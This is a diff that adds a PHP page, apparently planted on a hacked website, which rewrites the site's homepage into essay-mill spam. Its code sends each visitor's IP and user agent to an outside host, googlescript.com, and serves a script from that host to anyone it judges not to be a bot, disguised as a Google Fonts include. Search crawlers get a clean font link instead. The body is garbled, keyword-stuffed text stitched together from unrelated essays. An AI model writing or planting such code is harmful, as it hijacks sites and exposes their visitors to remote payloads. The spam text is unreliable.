@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Buy Quality Essays Perpetuities Uaplus Adoring buy quality essays Souvent Ldc Palmed Cannibalize | purplecube.in</title>
+<meta name="description" content="I should have the capacity to take up a gin factory right in my own yard. | Buy Quality Essays" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=css-font&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/css-font"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>buy quality essays Banner Subjective Datarecovery Modulates</h1>As a result of disobedience in the lives of people came to sin, buy quality essays suffering, disease, poverty, grief. <p>The only official language of Montreal is French, despite the significant presence of English-speaking population. Universal character set defines character codes correspondence - the basic elements of code space, representing negative integers. According to David Nishimoto (2007), Unicode consists of two main sections the Universal Character Set and a family of encodings. Don't forget to get inspired by our FREE essays and NEW sample papers at 911customessay. This is mainly the top management of the company, but to overcome this crisis - the company needs restructure and change of internal corporate culture. This standard allows encoding large number of characters from different scripts in the documents can co-exist Unicode Chinese characters, mathematical symbols, Greek letters, Latin and Cyrillic, while making it unnecessary to switch code pages. Franz-Josef Fritz (2008), changes and <strong>buy quality essays</strong> updating of the Unicode table of characters and new versions of the system is carried out writing a essay with quotes since the system was originally included only Unicode Plane 0 double-byte codes, come out and new documents to ISO.</p> <h2>Keep in touch with family users and friends who have utilized a divorce lawyer.</h2>We all know the story about how people <strong>buy quality essays</strong> turned away from God, violated His command, when still in the Garden of Eden. <p>As a matter of fact, today Nokia are faced with many problems. Without any doubts Nokia and Microsoft combine their interests in the area of services for innovation. According to Joel Spolsky (2003), universal system of encoding (Unicode) is a set of graphic symbols and a way to encode them for computer processing of buy quality essays text data. Ottawa is located in eastern Ontario on the banks of the Ottawa (which is the boundary between the provinces of Ontario and Quebec) and the Writing a essay with quotes Canal. But Jesus came to bring greater freedom than quotfs have dreamed. Ottawa is often referred to as the capital of Northern Silicon Valley.</p> <h2>It s almost impossible to assume a seaside with no palm tree.</h2>According to Unicode standards, codes are divided into several areas. <p>It should be noted that by making <a href="http://purplecube.in/custom-college-essay">custom college essay</a> the Windows Mobile as a platform for its smartphones, Nokia will help ensure a future for this platform, using its experience in optimizing hardware, the <a href="http://purplecube.in/professional-essay-writers-india">professional essay writers india</a> personalization software and language support. Ottawa is the fourth largest city in the country and second largest city in the province of Ontario, takes the sixth line in terms of the standard of living in the world, but Montreal is the second largest metropolis of Canada (after Toronto) and the largest city in Quebec. Graphical symbol - is a symbol of having a visible image. For example, Nokia introduced its new strategic direction, including changes in leadership and organizational structure. The company plans to form a writing a essay with quotes alliance with Microsoft to create a global mobile ecosystem, based on the complementary assets. It can be said that, currently, Nokia accelerate the holding buy quality essays of such changes by selecting a new path to the return the leading position in the smartphone market, strengthening the platform of mobile phones and sales of investments in the future. Graphic symbols are opposed to the characters and formatting characters. Nokia-Microsoft ecosystem will be focused on providing competitively differentiated products.</p> <h2>Expressing strategies and ideas among specialists or tutors are often vital..</h2>To overcome the current crisis, Nokia has already writing a essay with quotes a few steps. <p>Microsoft is one of the largest multinational companies producing software for all kinds of computers - personal writing a essay with quotes, game consoles, PDAs, mobile phones <a href="http://purplecube.in/custom-made-law-essays">custom made law essays</a> and other things, the developer of the most widely used at present in the world of software platform - a family of operating systems, Windows. It is one of the pioneers in the <strong>buy quality essays</strong> field of personal computers <a href="http://purplecube.in/pay-for-an-essay-to-be-written">pay for an essay to be written</a> and modern multitasking operating systems with graphical user interface. The staff of the Microsoft Corporation is about 90 thousand people. Unicode system exists in the following versions 1. Naturally, part of the code was reserved for future use. The population of Ottawa is 875 thousand inhabitants, with Gatineau 1 148 thousand. He came to liberate everyone from writing a essay with quotes power of Satan and sin. he does not recover the kingdom of Israel.</p> <h2>In other words the cable s other end has to be plugged into a computer device that s run on.</h2>buy quality essays Moreover, for cell phones Nokia has introduced an updated strategy, which aims to maximize innovation to connect the next billion of people to the Internet and their networking applications. <p>Many experts consider that Nokia today is in a critical point and major changes are inevitable for the company in its <a href="http://purplecube.in/who-can-write-a-essay-for-me">who can write a essay for me</a> movement. Further, there are signs of <strong>buy quality essays</strong> <strong>buy quality essays</strong> the various scripts, punctuation, and technical symbols. Thanks to the esthetical design and application of innovative technologies Apple has created a unique reputation in the industry of consumer electronics and has a great popularity, especially in the of Canada, and Montreal is a city in Canada. I think that liberal perspective fits best with my understanding of the family, because there should much, they think about their own problems, they are too busy to discuss the situation in the family and the majority of family members spend their time on the TV and computer. Montreal located in the buy quality essays southwestern part of the province of Quebec, a large industrial, scientific and cultural center. Also, the strategy is accompanied by substantial rearrangements in the team leaders Nokia, changes in organizational structure and approach. Jesus Christ (not later than 4 BC - 26-36 AC) is known as Jesus of Nazareth - a man that is the central figure of Christianity, which regards him as the Messiah foretold in the Old Testament, witing most Christian denominations believe that he is - the Son of God who rose from the dead.</p>
+                  </div>
+               </div>
